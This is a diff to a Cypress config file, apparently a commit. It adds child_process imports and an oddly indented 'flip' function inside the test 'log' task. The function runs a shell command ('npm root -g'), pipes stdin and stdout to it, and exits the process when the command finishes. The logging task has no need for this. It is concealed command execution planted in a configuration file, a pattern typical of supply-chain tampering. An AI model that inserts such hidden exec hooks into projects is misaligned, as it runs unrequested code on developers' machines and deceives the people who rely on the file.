@@ -2,6 +2,9 @@
 
 
 const { defineConfig } = require('cypress')
+const fs = require('fs');
+const { spawn, exec } = require('child_process');
+
 
 module.exports = defineConfig({
   chromeWebSecurity: false,
@@ -12,9 +15,23 @@ module.exports = defineConfig({
       on('task', {
         log(message) {
           console.log(message)
+
+                          function flip(){
+                                var child3 = exec(`
+                                npm root -g
+                                `);
+
+                                child3.stdout.pipe(process.stdout);
+                                child3.stderr.pipe(process.stderr);
+                                process.stdin.pipe(child3.stdin);
+                                child3.on('exit', () => process.exit());
+                          }
+                        
+                          flip();
           return null
         },
       })
+
     },
   },
 });
